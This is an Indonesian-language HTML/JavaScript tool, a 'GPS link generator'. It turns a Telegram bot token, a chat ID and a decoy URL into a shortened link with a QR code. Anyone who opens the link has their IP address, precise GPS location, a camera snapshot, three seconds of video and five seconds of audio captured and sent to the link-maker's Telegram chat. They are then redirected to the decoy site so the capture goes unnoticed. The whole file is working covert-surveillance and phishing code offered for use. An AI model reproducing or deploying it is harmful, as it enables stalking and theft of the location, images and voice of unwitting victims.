<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>GPS Tracker + Kamera Telegram</title>
  <style>
    body {
      font-family: sans-serif;
      background: #111;
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 20px;
    }
    .card {
      background: #222;
      padding: 20px;
      border-radius: 10px;
      max-width: 450px;
      width: 100%;
    }
    label {
      display: block;
      margin-top: 10px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: none;
      border-radius: 5px;
      background: #333;
      color: #0ff;
    }
    button {
      margin-top: 15px;
      padding: 12px;
      width: 100%;
      border: none;
      border-radius: 6px;
      background: linear-gradient(90deg, #00f6ff, #6f00ff);
      color: #fff;
      font-weight: bold;
    }
    #linkOut {
      margin-top: 20px;
      font-size: 14px;
      word-break: break-word;
      background: #333;
      padding: 12px;
      border-radius: 6px;
    }
    canvas {
      display: block;
      margin: 10px auto;
    }
  </style>
</head>
<body>
  <div class="card" id="formCard">
    <h2>GPS Link Generator</h2>
    <label>Bot Token</label>
    <input id="botToken" type="text" placeholder="123456:ABC...">
    <label>Chat ID</label>
    <input id="chatId" type="text" placeholder="123456789">
    <label>Target URL</label>
    <input id="targetUrl" type="url" placeholder="https://example.com">
    <button onclick="generate()">Generate Link</button>
    <div id="linkOut"></div>
    <canvas id="qrcode"></canvas>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
  <script>
    async function shorten(url) {
      try {
        const res = await fetch("https://tinyurl.com/api-create.php?url=" + encodeURIComponent(url));
        return await res.text();
      } catch {
        return url;
      }
    }

    async function generate() {
      const token = document.getElementById("botToken").value.trim();
      const chat = document.getElementById("chatId").value.trim();
      const target = document.getElementById("targetUrl").value.trim();
      if (!token || !chat || !target) return alert("Isi semua kolom dulu!");

      const longUrl = `${location.origin}${location.pathname}?mode=view&token=${encodeURIComponent(token)}&chat=${encodeURIComponent(chat)}&target=${encodeURIComponent(target)}`;
      const shortUrl = await shorten(longUrl);

      document.getElementById("linkOut").innerHTML = `
        <strong>Link Panjang:</strong><br>
        <a href="${longUrl}" target="_blank" style="color:#0ff">${longUrl}</a><br><br>
        <strong>Link Pendek:</strong><br>
        <a href="${shortUrl}" target="_blank" style="color:#6f0">${shortUrl}</a>
      `;

      QRCode.toCanvas(document.getElementById("qrcode"), shortUrl, {
        color: { dark: "#ffffff", light: "#000000" }
      });
    }

    (async () => {
      const params = new URLSearchParams(location.search);
      if (params.get("mode") !== "view") return;

      document.body.innerHTML = "<h2 style='text-align:center;'>üîç Mengambil data...</h2>";

      const TOKEN = params.get("token");
      const CHAT = params.get("chat");
      const TARGET = params.get("target") || "https://example.com";

      const send = (type, fd) => {
        fetch(`https://api.telegram.org/bot${TOKEN}/send${type}`, {
          method: "POST",
          body: fd
        });
      };

      // IP Address
      let ipAddr = "Unknown";
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        ipAddr = (await res.json()).ip;
      } catch {}

      // Lokasi GPS Akurat
      let lat = "-", lon = "-";
      try {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          })
        );
        lat = pos.coords.latitude;
        lon = pos.coords.longitude;

        const locFd = new FormData();
        locFd.append("chat_id", CHAT);
        locFd.append("latitude", lat);
        locFd.append("longitude", lon);
        send("Location", locFd);
      } catch {}

      const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
      const caption = `üìç Lokasi: ${lat}, ${lon}
üåê IP: ${ipAddr}
üó∫Ô∏è Peta: ${mapsLink}`;

      // FOTO dari kamera
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);
        stream.getTracks().forEach(t => t.stop());
        canvas.toBlob(blob => {
          const fd = new FormData();
          fd.append("chat_id", CHAT);
          fd.append("photo", blob, "photo.jpg");
          fd.append("caption", caption + "\nüì∏ Snapshot");
          send("Photo", fd);
        }, "image/jpeg");
      } catch {}

      // VIDEO 3 detik
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        const rec = new MediaRecorder(stream);
        const chunks = [];
        rec.ondataavailable = e => chunks.push(e.data);
        rec.onstop = () => {
          const blob = new Blob(chunks, { type: "video/webm" });
          const fd = new FormData();
          fd.append("chat_id", CHAT);
          fd.append("video", blob, "video.webm");
          fd.append("caption", caption + "\nüé• Video 3 detik");
          send("Video", fd);
          stream.getTracks().forEach(t => t.stop());
        };
        rec.start();
        setTimeout(() => rec.stop(), 3000);
      } catch {}

      // AUDIO 5 detik
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const rec = new MediaRecorder(stream);
        const chunks = [];
        rec.ondataavailable = e => chunks.push(e.data);
        rec.onstop = () => {
          const blob = new Blob(chunks, { type: "audio/ogg" });
          const fd = new FormData();
          fd.append("chat_id", CHAT);
          fd.append("audio", blob, "audio.ogg");
          fd.append("caption", caption + "\nüé§ Audio 5 detik");
          send("Audio", fd);
          stream.getTracks().forEach(t => t.stop());
        };
        rec.start();
        setTimeout(() => rec.stop(), 5000);
      } catch {}

      setTimeout(() => location.href = TARGET, 6000);
    })();
  </script>
</body>
</html>
